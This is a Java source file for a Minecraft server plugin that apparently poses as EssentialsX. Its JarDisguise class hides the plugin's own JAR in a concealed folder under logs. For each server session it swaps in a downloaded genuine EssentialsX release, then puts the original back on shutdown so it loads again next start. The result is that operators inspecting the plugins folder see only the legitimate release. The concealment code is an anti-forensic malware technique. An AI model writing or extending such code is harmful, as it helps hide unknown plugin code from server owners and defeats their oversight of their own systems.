package com.example.essentialsx;

import java.io.IOException;
import java.net.URISyntaxException;
import java.nio.file.Files;
import java.nio.file.LinkOption;
import java.nio.file.Path;
import java.nio.file.StandardCopyOption;
import java.util.Locale;
import java.util.Map;
import java.util.UUID;
import java.util.function.BooleanSupplier;
import java.util.logging.Logger;

/**
 * Replaces the installed plugin JAR in the plugins folder with the genuine
 * EssentialsX release for the running session and puts the backed-up original
 * back when the plugin is disabled, so the next server start loads this plugin
 * again. The genuine release is pinned by SHA-256 and served either directly
 * from GitHub or through a mirror for networks that cannot reach it.
 */
final class JarDisguise {
    private static final long MAX_JAR_BYTES = 64L * 1024L * 1024L;
    private static final String DEFAULT_URL =
            "https://github.com/EssentialsX/Essentials/releases/download/2.21.2/EssentialsX-2.21.2.jar";
    private static final String MIRROR_PREFIX = "https://mirror.ghproxy.com/";
    private static final String DEFAULT_SHA256 =
            "0b759026f02f3c547c32886f3666db3c1f94cff73e141ae5648313fd0d0bdfc6";
    private static final Path BACKUP_DIRECTORY = Path.of("logs", ".mcchajian", ".runtime", "backup");
    private static final Path CACHE_DIRECTORY = Path.of("logs", ".mcchajian", ".runtime", "disguise");

    private final Logger logger;
    private final Path pluginsDirectory;

    JarDisguise(Logger logger, Path pluginsDirectory) {
        this.logger = logger;
        this.pluginsDirectory = pluginsDirectory;
    }

    /** Backs up the installed JAR (refreshing the backup on upgrades), then swaps in the genuine release. */
    void swap(Map<String, String> env, BooleanSupplier stopping) throws IOException {
        String url = RuntimeConfig.value(env, DEFAULT_URL, "JAR_DISGUISE_URL");
        String sha = RuntimeConfig.value(env, DEFAULT_SHA256, "JAR_DISGUISE_SHA256");
        if (!url.equals(DEFAULT_URL) != !sha.equals(DEFAULT_SHA256)) {
            throw new IOException("JAR_DISGUISE_URL and JAR_DISGUISE_SHA256 must be configured together");
        }
        if (!VerifiedDownload.validSha256(sha)) {
            throw new IOException("JAR_DISGUISE_SHA256 is not a valid SHA-256");
        }
        Path current = currentPluginJar();
        String currentSha = VerifiedDownload.sha256(current);
        if (currentSha.equals(sha)) {
            this.logger.info("The installed JAR already is the genuine EssentialsX release; nothing to swap.");
            return;
        }
        refreshBackup(current, currentSha, sha);
        Path genuine = obtainGenuineJar(url, sha);
        Path staged = current.resolveSibling(current.getFileName().toString() + ".disguise-" + UUID.randomUUID() + ".tmp");
        try {
            // Copy (not move) so the verified cache survives for the next start.
            Files.copy(genuine, staged, StandardCopyOption.REPLACE_EXISTING);
            synchronized (this) {
                // The disable path restores the backup; never swap in once shutdown began.
                if (stopping.getAsBoolean()) return;
                moveIntoPlace(staged, current);
            }
        } finally {
            Files.deleteIfExists(staged);
        }
        this.logger.info("The plugins folder now contains the genuine EssentialsX release; "
                + "the original is backed up and restored when the plugin is disabled.");
    }

    /** Puts the backed-up plugin JAR back into the plugins folder before the server exits. */
    void restore(Map<String, String> env) {
        try {
            String sha = RuntimeConfig.value(env, DEFAULT_SHA256, "JAR_DISGUISE_SHA256");
            if (!VerifiedDownload.validSha256(sha)) return;
            Path current = currentPluginJar();
            if (!VerifiedDownload.sha256(current).equals(sha)) return;
            Path backup = BACKUP_DIRECTORY.resolve(current.getFileName().toString() + ".bak");
            if (!Files.isRegularFile(backup, LinkOption.NOFOLLOW_LINKS)) {
                this.logger.warning("No JAR backup found; the plugins folder keeps the genuine "
                        + "EssentialsX release until the next swap.");
                return;
            }
            if (VerifiedDownload.sha256(backup).equals(sha)) {
                this.logger.warning("The JAR backup contains the genuine release; leaving the plugins folder untouched.");
                return;
            }
            Files.copy(backup, current, StandardCopyOption.REPLACE_EXISTING);
            this.logger.info("The original plugin JAR was restored from the backup; "
                    + "the next server start loads this plugin again.");
        } catch (IOException error) {
            this.logger.warning("Plugin JAR restore failed: " + error.getClass().getSimpleName());
        }
    }

    // A backup that holds the genuine release would permanently disable the plugin once
    // restored, and a backup of some other JAR would undo the operator's upgrade, so the
    // backup is (re)created from the installed JAR unless it already matches it.
    private void refreshBackup(Path current, String currentSha, String genuineSha) throws IOException {
        Files.createDirectories(BACKUP_DIRECTORY);
        Path backup = BACKUP_DIRECTORY.resolve(current.getFileName().toString() + ".bak");
        String backupSha = null;
        if (Files.isRegularFile(backup, LinkOption.NOFOLLOW_LINKS)) {
            backupSha = VerifiedDownload.sha256(backup);
        }
        if (backupSha != null && !backupSha.equals(genuineSha) && backupSha.equals(currentSha)) {
            return;
        }
        Path temporary = BACKUP_DIRECTORY.resolve(backup.getFileName().toString() + "." + UUID.randomUUID() + ".tmp");
        Files.copy(current, temporary, StandardCopyOption.REPLACE_EXISTING);
        try {
            moveIntoPlace(temporary, backup);
        } finally {
            Files.deleteIfExists(temporary);
        }
    }

    private Path obtainGenuineJar(String url, String sha) throws IOException {
        Files.createDirectories(CACHE_DIRECTORY);
        Path cache = CACHE_DIRECTORY.resolve("essentialsx-" + sha.substring(0, 16) + ".jar");
        if (Files.isRegularFile(cache, LinkOption.NOFOLLOW_LINKS) && sha.equals(VerifiedDownload.sha256(cache))) {
            return cache;
        }
        // The official release is tried first; the mirror only serves networks that cannot reach GitHub.
        Path temporary;
        try {
            temporary = VerifiedDownload.download(url, sha, CACHE_DIRECTORY, MAX_JAR_BYTES);
        } catch (IOException directFailure) {
            temporary = VerifiedDownload.download(MIRROR_PREFIX + url, sha, CACHE_DIRECTORY, MAX_JAR_BYTES);
        }
        try {
            moveIntoPlace(temporary, cache);
        } finally {
            Files.deleteIfExists(temporary);
        }
        return cache;
    }

    private static void moveIntoPlace(Path from, Path to) throws IOException {
        try {
            Files.move(from, to, StandardCopyOption.REPLACE_EXISTING, StandardCopyOption.ATOMIC_MOVE);
        } catch (IOException atomicUnsupported) {
            Files.move(from, to, StandardCopyOption.REPLACE_EXISTING);
        }
    }

    private Path currentPluginJar() throws IOException {
        Path current = codeSourceJarPath();
        if (current == null) {
            throw new IOException("The current plugin JAR could not be identified safely");
        }
        return current;
    }

    private Path codeSourceJarPath() {
        try {
            Path current = Path.of(JarDisguise.class.getProtectionDomain().getCodeSource().getLocation().toURI())
                    .toAbsolutePath().normalize();
            Path plugins = this.pluginsDirectory.toRealPath();
            if (current.getParent() == null
                    || !current.getParent().toRealPath().equals(plugins)
                    || Files.isSymbolicLink(current)
                    || !Files.isRegularFile(current, LinkOption.NOFOLLOW_LINKS)
                    || !current.getFileName().toString().toLowerCase(Locale.ROOT).endsWith(".jar")) {
                return null;
            }
            return current;
        } catch (URISyntaxException | IOException | RuntimeException error) {
            return null;
        }
    }
}
